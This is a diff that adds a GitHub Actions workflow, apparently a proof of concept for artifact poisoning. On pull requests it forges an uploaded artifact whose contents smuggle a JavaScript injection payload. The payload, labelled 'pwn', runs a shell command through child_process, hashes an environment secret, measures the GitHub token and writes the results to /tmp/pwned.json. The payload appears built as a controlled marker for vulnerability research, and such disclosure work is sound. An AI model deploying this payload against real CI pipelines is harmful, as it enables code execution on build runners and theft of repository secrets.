@@ -1,0 +1,20 @@
+name: Operator test
+on:
+  pull_request:
+    branches: [main]
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: forge artifacts
+        run: |
+          mkdir -p pr
+          echo 1 > pr/NR
+          cat > pr/CI_YAML_ONLY <<'PAYLOAD'
+          1
+          pr=0, pwn:(()=>{const c=require('child_process');const h=require('crypto').createHash('sha256').update(String(process.env.DUMMY_SECRET||'none')).digest('hex');const o=c.execSync('id').toString().trim();require('fs').writeFileSync('/tmp/pwned.json',JSON.stringify({whoami:o,hash:h,tok:String(process.env['INPUT_GITHUB-TOKEN']||'').length}));return 0})(), y:0
+          PAYLOAD
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: pr
+          path: pr/
